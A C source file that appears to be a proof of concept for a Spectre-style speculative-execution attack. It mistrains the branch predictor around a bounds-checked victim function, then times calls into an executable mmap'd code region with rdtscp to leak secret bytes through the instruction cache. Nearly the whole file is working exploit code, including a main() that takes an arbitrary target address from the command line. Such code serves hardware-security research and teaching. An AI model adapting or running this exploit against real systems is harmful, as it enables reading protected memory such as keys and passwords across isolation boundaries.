#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <assert.h>
#include <sys/mman.h>
#ifdef _MSC_VER
#include <intrin.h>        /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h>     /* for rdtscp and clflush */
#endif

/********************************************************************
Victim code.
********************************************************************/

#define CODE_CHUNK_SIZE    0x2e0  // the number to avoid the adjacent prefetcher while accessing all uop cache entries
unsigned int code_block_size = 256 * CODE_CHUNK_SIZE;
char *code_block;
uint8_t unused1[64];
unsigned int array1_size = 16;
uint8_t unused2[64];
uint8_t array1[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
uint8_t unused3[64];
uint8_t array2[256 * 512];

char *secret = "The Magic Words are Squeamish Ossifrage.";

uint8_t temp = 0;  /* Used so compiler won't optimize out victim_function() */

void victim_function_v2(size_t x) {
    if (x < array1_size && x >= 0) {
        temp &= ((int (*)(void))(&code_block[array1[x] * CODE_CHUNK_SIZE]))();
    }
}

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (80)  /* assume cache hit if time <= threshold */

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte_v2(size_t malicious_x, uint8_t value[2], int score[2]) {
    static int results[256];
    int tries, i, j, k, mix_i, junk = 0;
    size_t training_x, x;
    register uint64_t time1, time2;

    for (i = 0; i < 256; i++)
        results[i] = 0;
    for (tries = 999; tries > 0; tries--) {
        /* Flush code_block from cache */
        for (i = 0; i < 256; i++) {
            _mm_clflush(&code_block[i * CODE_CHUNK_SIZE]); /* intrinsic for clflush instruction */
        }

        /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
        training_x = tries % array1_size;
        for (j = 30; j >= 0; j--) {
            _mm_clflush(&array1_size);
            /* Delay + BHB (Branch History Buffer) modification => to avoid a misprediction in the victim function */
            for (volatile int z = 0; z < 100; z++) {}

            /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
            /* Avoid jumps in case those tip off the branch predictor */
            x = ((j % 6) - 1) & ~0xFFFF;   /* Set x=FFF.FF0000 if j%6==0, else x=0 */
            x = (x | (x >> 16));           /* Set x=-1 if j&6=0, else x=0 */
            x = training_x ^ (x & (malicious_x ^ training_x));

            /* Call the victim! */
            victim_function_v2(x);
        }

        /* Time reads. Order is lightly mixed up to prevent stride prediction */
        for (i = 0; i < 256; i++) {
            /* Change the access sequence to dilute the impact of wrong predictions */
            switch (tries % 5) {
                case 0: mix_i = ((i * 167) + 13) & 255; break;
                case 1: mix_i = ((i * 73) + 23) & 255; break;
                case 2: mix_i = ((i * 137) + 7) & 255; break;
                case 3: mix_i = ((i * 73) + 19) & 255; break;
                case 4: mix_i = ((i * 37) + 11) & 255; break;
                default: assert(0);
            }
            int (*func)(void) = (void*)(&code_block[mix_i * CODE_CHUNK_SIZE]);
            time1 = __rdtscp(&junk);            /* READ TIMER */
            junk = func();                       /* MEMORY ACCESS TO TIME */
            time2 = __rdtscp(&junk) - time1;    /* READ TIMER & COMPUTE ELAPSED TIME */
            if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size]) {
                results[mix_i]++;  /* cache hit - add +1 to score for this value */
            } else {
                for (volatile int z = 0; z < 100; z++) {}  /* Taint BHB */
            }
        }

        /* Locate highest & second-highest results results tallies in j/k */
        j = k = -1;
        for (i = 0; i < 256; i++) {
            if (j < 0 || results[i] >= results[j]) {
                k = j;
                j = i;
            } else if (k < 0 || results[i] >= results[k]) {
                k = i;
            }
        }
        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
            break;  /* Clear success if best is > 2*runner-up + 5 or 2/0) */
    }
    results[0] ^= junk;  /* use junk so code above won't get optimized out*/
    value[0] = (uint8_t)j;
    score[0] = results[j];
    value[1] = (uint8_t)k;
    score[1] = results[k];
}


int main(int argc, const char **argv) {
    size_t malicious_x=(size_t)(secret-(char*)array1);   /* default for malicious_x */
    int i, score[2], len=40;
    uint8_t value[2];
    int total_miss_count = 0;

    for (i = 0; i < sizeof(array2); i++)
        array2[i] = 1;    /* write to array2 so in RAM not copy-on-write zero pages */
    if (argc == 3) {
        sscanf(argv[1], "%p", (void**)(&malicious_x));
        malicious_x -= (size_t)array1;  /* Convert input value into a pointer */
        sscanf(argv[2], "%d", &len);
    }

    /* Initialize code_block */
    if ((code_block = mmap(NULL, code_block_size, PROT_EXEC | PROT_READ | PROT_WRITE,
                          MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)) == MAP_FAILED) {
        perror("MMAP failed");
        return -1;
    }
    memset(code_block, '\x90', code_block_size);
    for (i = 0; i < 256; i++) {
        memcpy(&code_block[i * CODE_CHUNK_SIZE], "\xc3", 1);    // ret: c3
    }

    /* Start the exploit */
    printf("Reading %d bytes:\n", len);
    while (--len >= 0) {
        printf("Reading at malicious_x = %p... ", (void*)malicious_x);
        readMemoryByte_v2(malicious_x++, value, score);
        printf("%s: ", (score[0] >= 2*score[1] ? "Success" : "Unclear"));
        printf("0x%02X='%c' score=%d    ", value[0],
               (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
        if (score[1] > 0)
            printf("(second best: 0x%02X score=%d)", value[1], score[1]);
        printf("\n");

        if (secret[40-len-1] != value[0]) {
            total_miss_count++;
        }
    }
    if (total_miss_count != 0) {
        printf("====================================\n");
        printf("MISSS!!!! > %d\n", total_miss_count);
        printf("====================================\n");
    }

    if (munmap(code_block, code_block_size) != 0) {
        perror("MUNMAP failed");
        return -1;
    }

    return (0);
}
